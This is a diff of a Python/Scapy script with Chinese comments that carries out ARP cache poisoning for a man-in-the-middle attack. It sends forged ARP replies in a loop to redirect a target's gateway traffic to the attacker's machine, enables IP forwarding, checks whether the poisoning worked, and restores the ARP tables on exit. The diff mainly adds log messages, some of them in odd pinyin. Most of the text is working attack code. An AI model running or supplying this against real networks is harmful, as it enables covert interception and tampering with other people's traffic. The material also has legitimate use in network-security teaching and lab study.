@@ -14,13 +14,17 @@ def disable_ip_forwarding():
 
 def send_arp_poison(target_ip, target_mac, gateway_ip, attacker_mac, iface):
     """发送伪造的 ARP 包"""
+    # 伪造网关到目标设备的 ARP 包
     packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=attacker_mac)
     send(packet, iface=iface, verbose=False)
+    print(f"[INFO] ARP: {gateway_ip} ({attacker_mac}) -> {target_ip} ({target_mac})")
 
 def restore_arp(target_ip, target_mac, gateway_ip, gateway_mac):
     """恢复 ARP 表"""
+    print("[INFO] FFFAR...")
     send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac), count=3)
     send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac), count=3)
+    print("[INFO] ARP")
 
 def get_mac(ip):
     """获取目标设备的 MAC 地址"""
@@ -41,27 +45,34 @@ def main():
     gateway_mac = getmacbyip(gateway_ip)  # 网关 MAC 地址
 
     if target_mac is None or gateway_mac is None:
+        print("[ERROR] MAC")
         return
+
+    print(f"[INFO] 1: {target_ip} ({target_mac})")
+    print(f"[INFO] 2: {gateway_ip} ({gateway_mac})")
+    print(f"[INFO] 3: {attacker_mac}")
 
     try:
         # 启用 IP 转发
         enable_ip_forwarding()
 
+        print("[INFO] kaishi ARP ...")
+
         while True:
             # 持续发送伪造的 ARP 包
             send_arp_poison(target_ip, target_mac, gateway_ip, attacker_mac, iface)
-
-            # 检查目标设备的 MAC 地址是否被更改
+            
+            # 检查目标设备的 ARP 表是否已经修改
             observed_mac = get_mac(target_ip)
             if observed_mac != gateway_mac:
-                print(f"[INFO] 111111111 {observed_mac}")
+                print(f"[INFO]  ARP xuigaicheng: {observed_mac}")
             else:
-                print(f"[INFO] 000000{observed_mac}")
+                print(f"[INFO]  ARP shibai: {observed_mac}")
 
             time.sleep(2)  # 每隔 2 秒发送一次
 
     except KeyboardInterrupt:
-        # 恢复 ARP 表
+        print("\n[INFO] error...")
         restore_arp(target_ip, target_mac, gateway_ip, gateway_mac)
 
     finally:
